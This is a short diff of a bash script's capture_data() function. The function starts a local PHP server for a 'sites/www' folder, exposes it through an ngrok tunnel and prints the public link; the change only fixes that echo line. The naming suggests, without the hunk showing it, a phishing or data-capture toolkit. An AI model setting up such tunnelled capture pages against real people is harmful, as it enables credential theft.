@@ -173,12 +173,11 @@ capture_data() {
 echo -e $red initializing... http://$HOST:$PORT
 sleep 1
 cd sites/www && php -S $HOST:$PORT > /dev/null 2>&1 & 
-
 sleep 2
 sites/ngrok http $HOST:$PORT > /dev/null 2>&1 &
 sleep 7
 ngrok_link=$(curl -s -N $HOST:$PORT | grep -o "https://[0-9a-z]*\.ngrok.io")
-echo -e $red SENDING LINK ngrok_link
+echo -e $red SENDING LINK : $ngrok_link
 
 }
 
